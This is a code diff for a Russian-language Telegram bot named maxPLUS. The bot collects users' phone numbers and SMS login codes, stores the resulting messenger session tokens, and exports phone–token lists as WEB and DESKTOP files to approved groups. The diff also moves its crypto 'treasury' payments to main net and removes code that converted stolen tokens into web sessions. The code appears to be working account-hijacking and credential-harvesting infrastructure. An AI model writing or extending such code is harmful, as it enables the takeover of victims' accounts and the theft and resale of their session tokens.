@@ -32,7 +32,7 @@ pending = {}
 waiting_code = {}
 expecting_phone = set()
 db_pool = None
-crypto = AioCryptoPay(token=CRYPTO_BOT_TOKEN, network=Networks.TEST_NET) if CRYPTO_BOT_TOKEN else None
+crypto = AioCryptoPay(token=CRYPTO_BOT_TOKEN, network=Networks.MAIN_NET) if CRYPTO_BOT_TOKEN else None
 
 # === TelegramSmsProvider ===
 class TelegramSmsProvider:
@@ -186,15 +186,20 @@ async def help_cmd(msg: Message):
         return
 
     text = (
-        "📋 <b>Команды MaxPlus:</b>\n\n"
-        "/get — Получить все токены и статистику\n"
-        "/convert — Конвертировать токены в WEB\n"
-        "/pay — Пополнить казну бота\n"
-        "/help — Показать эту справку\n\n"
-        "<b>Как авторизоваться:</b>\n"
-        "1. Отправь номер в личку боту\n"
-        "2. Дождись SMS\n"
-        "3. Введи код <b>ответом</b> на второе сообщение бота"
+        "📋 <b>Команды maxPLUS</b>\n\n"
+        "┌ <b>Основные:</b>\n"
+        "├ /start — Главное меню\n"
+        "├ /stats — Статистика и выгрузка токенов\n"
+        "└ /help — Список команд\n\n"
+        "┌ <b>Казна:</b>\n"
+        "└ /pay 5.00 — Пополнить казну\n\n"
+        "┌ <b>Админ:</b>\n"
+        "├ /set ID — Одобрить группу\n"
+        "└ /unset ID — Запретить группу\n\n"
+        "<b>Авторизация:</b>\n"
+        "1. Нажмите «Начать работу»\n"
+        "2. Отправьте номер телефона\n"
+        "3. Введите код <b>ответом</b> на сообщение бота"
     )
     await msg.answer(text, parse_mode="HTML")
 
@@ -237,45 +242,44 @@ async def unset_group(msg: Message):
     except (IndexError, ValueError):
         await msg.answer("❌ Используй: /unset ID_группы")
 
-@dp.message(Command("get"))
-async def get_tokens(msg: Message):
+@dp.message(Command("stats"))
+async def stats_cmd(msg: Message):
     if not await is_approved_group(msg):
         return
 
-    status_msg = await msg.answer("⏳ Собираю токены...")
     tokens = await get_all_tokens()
+    total_tokens = len(tokens)
+    alive_tokens = sum(1 for t in tokens if t["alive"])
 
-    if not tokens:
-        return await status_msg.edit_text("📭 Токенов пока нет")
+    async with db_pool.acquire() as conn:
+        user_count = await conn.fetchval("SELECT COUNT(*) FROM users")
 
-    text = f"📊 Всего токенов: {len(tokens)}\n\n"
-    alive = 0
-    dead = 0
+    treasury_text = "Нет данных"
+    if crypto:
+        try:
+            balances = await crypto.get_balance()
+            treasury_parts = []
+            for b in balances:
+                treasury_parts.append(f"└ {b.currency_code}: {b.available}")
+            treasury_text = "\n".join(treasury_parts) if treasury_parts else "└ Пусто"
+        except Exception:
+            treasury_text = "└ Ошибка получения"
 
-    for t in tokens:
-        phone = t["phone"]
-        token = t["token"]
-        is_alive = await check_token_alive(token)
-        await update_token_status(phone, is_alive)
-        if is_alive:
-            alive += 1
-            text += f"✅ {phone}\n"
-        else:
-            dead += 1
-            text += f"❌ {phone}\n"
+    text = (
+        f"📊 <b>Статистика maxPLUS</b>\n\n"
+        f"👥 Пользователей: {user_count or 0}\n"
+        f"🔑 Авторизовано: {total_tokens} (живых: {alive_tokens})\n\n"
+        f"💰 <b>Баланс казны:</b>\n{treasury_text}"
+    )
 
-    text += f"\nЖивых: {alive} | Мёртвых: {dead}"
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="📥 Выгрузить WEB", callback_data="export_web"),
+            InlineKeyboardButton(text="📥 Выгрузить DESKTOP", callback_data="export_desktop")
+        ]
+    ])
 
-    file_text = ""
-    for t in tokens:
-        file_text += f"{t['phone']} — {t['token']}\n"
-
-    from io import BytesIO
-    file = BytesIO(file_text.encode())
-    file.name = "tokens.txt"
-
-    await msg.answer_document(file, caption=text)
-    logger.info(f"Group {msg.chat.id} — /get, токенов: {len(tokens)}")
+    await msg.answer(text, reply_markup=keyboard, parse_mode="HTML")
 
 # === Пополнение казны ===
 @dp.message(Command("pay"))
@@ -365,6 +369,41 @@ async def withdraw_callback(callback: CallbackQuery):
         )
     await callback.answer()
 
+@dp.callback_query(lambda c: c.data == "export_web")
+async def export_web_callback(callback: CallbackQuery):
+    tokens = await get_all_tokens()
+    web_tokens_list = []
+
+    for t in tokens:
+        web_token = read_token_from_session(f"web_{t['phone']}")
+        if web_token:
+            web_tokens_list.append(f"{t['phone']} — {web_token}")
+
+    if not web_tokens_list:
+        await callback.answer("Нет WEB-токенов для выгрузки", show_alert=True)
+        return
+
+    from io import BytesIO
+    file = BytesIO("\n".join(web_tokens_list).encode())
+    file.name = "web_tokens.txt"
+    await callback.message.answer_document(file, caption=f"WEB-токены ({len(web_tokens_list)} шт.)")
+    await callback.answer()
+
+@dp.callback_query(lambda c: c.data == "export_desktop")
+async def export_desktop_callback(callback: CallbackQuery):
+    tokens = await get_all_tokens()
+    desktop_list = [f"{t['phone']} — {t['token']}" for t in tokens]
+
+    if not desktop_list:
+        await callback.answer("Нет DESKTOP-токенов для выгрузки", show_alert=True)
+        return
+
+    from io import BytesIO
+    file = BytesIO("\n".join(desktop_list).encode())
+    file.name = "desktop_tokens.txt"
+    await callback.message.answer_document(file, caption=f"DESKTOP-токены ({len(desktop_list)} шт.)")
+    await callback.answer()
+
 @dp.callback_query(lambda c: c.data == "faq")
 async def faq_callback(callback: CallbackQuery):
     text = (
@@ -408,81 +447,6 @@ async def code_timeout(user_id: int, phone: str):
             await bot.send_message(user_id, "🔖 Время на ввод кода истекло. Пожалуйста, начните авторизацию заново")
         except Exception:
             pass
-
-# === Конвертация токенов в WEB ===
-@dp.message(Command("convert"))
-async def convert_token(msg: Message):
-    if not await is_approved_group(msg):
-        return
-
-    args = msg.text.split()
-    convert_all = len(args) > 1 and args[1].lower() == "all"
-
-    if not convert_all:
-        try:
-            phone = args[1]
-        except IndexError:
-            return await msg.answer("❌ Используй: /convert +79161234567 или /convert all")
-
-    tokens = await get_all_tokens()
-
-    if convert_all:
-        if not tokens:
-            return await msg.answer("📭 Токенов для конвертации нет")
-
-        status_msg = await msg.answer(f"⏳ Конвертирую все токены ({len(tokens)} шт.)...")
-        converted = 0
-        web_tokens_list = []
-
-        for t in tokens:
-            phone = t["phone"]
-            token = t["token"]
-            try:
-                web_client = WebClient(
-                    work_dir="cache",
-                    session_name=f"web_{phone}.db",
-                    extra_config=ExtraConfig(token=token),
-                )
-                await web_client.start()
-                web_token = read_token_from_session(f"web_{phone}")
-                if web_token:
-                    await save_token_to_db(phone, web_token)
-                    web_tokens_list.append(f"{phone} — {web_token}")
-                    converted += 1
-                    logger.info(f"Converted {phone} -> WEB")
-            except Exception as e:
-                logger.warning(f"Failed to convert {phone}: {e}")
-
-        from io import BytesIO
-        file = BytesIO("\n".join(web_tokens_list).encode())
-        file.name = "web_tokens.txt"
-
-        await status_msg.edit_text(f"✅ Конвертировано: {converted}/{len(tokens)}")
-        await msg.answer_document(file, caption=f"📊 WEB-токены ({converted} шт.)")
-        return
-
-    token_data = next((t for t in tokens if t["phone"] == phone), None)
-    if not token_data:
-        return await msg.answer("❌ Токен для этого номера не найден")
-
-    status_msg = await msg.answer("⏳ Конвертирую токен в WEB...")
-
-    try:
-        web_client = WebClient(
-            work_dir="cache",
-            session_name=f"web_{phone}.db",
-            extra_config=ExtraConfig(token=token_data["token"]),
-        )
-        await web_client.start()
-        web_token = read_token_from_session(f"web_{phone}")
-        if web_token:
-            await save_token_to_db(phone, web_token)
-            await status_msg.edit_text(f"✅ Токен для {phone} конвертирован в WEB")
-            logger.info(f"Group {msg.chat.id} — /convert {phone} -> WEB")
-        else:
-            await status_msg.edit_text("❌ Не удалось получить WEB-токен")
-    except Exception as e:
-        await status_msg.edit_text(f"❌ Ошибка конвертации: {e}")
 
 # === Обработчик номера телефона ===
 
